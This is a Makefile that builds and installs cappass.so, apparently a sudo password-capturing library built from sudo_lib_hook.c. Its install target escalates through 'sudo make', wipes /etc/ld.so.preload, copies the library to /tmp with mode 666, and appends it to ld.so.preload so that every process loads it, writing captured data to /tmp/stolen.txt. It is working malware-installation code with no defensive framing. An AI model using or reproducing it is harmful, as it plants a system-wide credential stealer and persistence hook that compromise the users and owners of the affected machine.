# Define the C compiler and flags
CC = gcc
CFLAGS = -Wall -fPIC -shared
LIBS = -ldl
UID = id -u
DEL = rm -f
TOUCH = touch
COPY = cp
PERMS = chmod
ECHO = echo
RAISE = sudo make
LDSOPRE = /etc/ld.so.preload
INSTLOC = /tmp
SLNAME = cappass.so
PASSFILE = stolen.txt
LIBLOC = $(INSTLOC)/$(SLNAME)
PFLOC = $(INSTLOC)/$(PASSFILE)

all: cappass.so

cappass.so: sudo_lib_hook.c
	$(CC) $(CFLAGS) -o $@ $^

# Phony target for cleaning up generated files
.PHONY: clean
clean:
	$(DEL) $(SLNAME) $(PFLOC)

install: all
    ifneq ($(shell $(UID)), 0)
	$(RAISE) $@
    else
	$(DEL) $(LIBLOC) $(LDSOPRE) $(PFLOC)
	$(COPY) $(SLNAME) $(LIBLOC)
	$(PERMS) 666 $(LIBLOC)
	$(TOUCH) $(PFLOC)
	$(PERMS) 644 $(PFLOC)
	$(ECHO) $(LIBLOC) >> $(LDSOPRE)
   endif

deinstall: all
    ifneq ($(shell $(UID)), 0)
	$(RAISE) $@
    else
	$(DEL) $(LIBLOC) $(LDSOPRE) $(PFLOC)
    endif
